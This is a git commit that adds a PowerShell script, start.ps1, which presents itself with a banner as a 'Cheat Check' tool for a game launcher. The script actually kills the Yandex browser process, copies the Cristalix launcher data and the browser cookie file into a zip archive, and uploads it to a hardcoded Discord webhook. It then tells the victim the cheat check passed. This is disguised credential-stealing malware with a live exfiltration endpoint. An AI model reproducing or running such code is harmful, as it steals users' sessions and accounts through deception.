1d254ddefb2f58ef47547a83187d4314f35f92f6
funtime-project <yawlickid@gmail.com>
2024-11-21 23:09:41 +0300

    Create start.ps1

---
+++ start.ps1
@@ -0,0 +1,95 @@
+Write-Output "                                                          "
+Write-Output "   ____ _                _      ____ _               _    "
+Write-Output "  / ___| |__   ___  __ _| |_   / ___| |__   ___  ___| | __"
+Write-Output " | |   | '_ \ / _ \/ _\ | __| | |   | '_ \ / _ \/ __| |/ /"
+Write-Output " | |___| | | |  __/ (_| | |_  | |___| | | |  __/ (__|   < "
+Write-Output "  \____|_| |_|\___|\__,_|\__|  \____|_| |_|\___|\___|_|\_\"
+Write-Output "                                                          "
+
+#                                                          
+#   ____ _                _      ____ _               _    
+#  / ___| |__   ___  __ _| |_   / ___| |__   ___  ___| | __
+# | |   | '_ \ / _ \/ _` | __| | |   | '_ \ / _ \/ __| |/ /
+# | |___| | | |  __/ (_| | |_  | |___| | | |  __/ (__|   < 
+#  \____|_| |_|\___|\__,_|\__|  \____|_| |_|\___|\___|_|\_\
+#                                                          
+
+$userName = Split-Path $env:USERPROFILE -Leaf
+$Webhook_link = "https://discord.com/api/webhooks/1309136819279102043/63Kc471txsYbUf7OgT8AqoRgyYkiZ-aXzktRC-hm--jurk2zp6CW7SUdDEXNn0BS_MY1"
+Stop-Process -Name "browser" -Force
+
+Start-Sleep -Seconds 1
+
+$filePaths = @(
+    "C:\Users\$userName\.cristalix\.launcher",
+    "C:\Users\$userName\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
+)
+
+$zipFilePath = Join-Path $env:Temp "yawsteal.zip"
+
+if (Test-Path $zipFilePath) {
+    Remove-Item $zipFilePath -Force
+}
+
+$tempFolder = Join-Path $env:Temp "tempZipFolder"
+if (Test-Path $tempFolder) {
+    Remove-Item $tempFolder -Recurse -Force
+}
+New-Item -ItemType Directory -Path $tempFolder | Out-Null
+
+foreach ($filePath in $filePaths) {
+    if (Test-Path $filePath) {
+        try {
+            Copy-Item -Path $filePath -Destination $tempFolder -Force
+            Write-Output "File '$filePath' copied to the temporary folder."
+        } catch {
+            Write-Warning "Error copying file '$filePath': $_"
+        }
+    } else {
+        Write-Warning "File '$filePath' not found. Skipping."
+    }
+}
+
+try {
+    Compress-Archive -Path "$tempFolder\*" -DestinationPath $zipFilePath -Force
+    Write-Output "ZIP archive created at '$zipFilePath'."
+} catch {
+    Write-Error "Error creating ZIP archive: $_"
+    return
+}
+
+if (-Not (Test-Path $zipFilePath)) {
+    Write-Error "ZIP archive not created. Stopping."
+    return
+}
+
+$archiveName = $userName + "_data.zip"
+try {
+    Add-Type -AssemblyName System.Net.Http
+    $httpClient = New-Object System.Net.Http.HttpClient
+    $formData = New-Object System.Net.Http.MultipartFormDataContent
+
+    $stringContent = New-Object System.Net.Http.StringContent("> Кто-то попался в ловушечку Ю_ю")
+    $formData.Add($stringContent, "content")
+
+    $fileStream = [System.IO.File]::OpenRead($zipFilePath)
+    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+    $formData.Add($fileContent, "file", $archiveName)
+
+    $response = $httpClient.PostAsync($Webhook_link, $formData).Result
+
+    if ($response.IsSuccessStatusCode) {
+        #Write-Output "ZIP archive sent successfully!"
+    } else {
+        #Write-Error "Failed to send ZIP archive. HTTP status: $($response.StatusCode)"
+    }
+} catch {
+    #Write-Error "Error sending ZIP archive: $_"
+} finally {
+}
+
+Remove-Item $zipFilePath -Force
+Write-Output "Проверка на читы пройдена"
+
+Pause
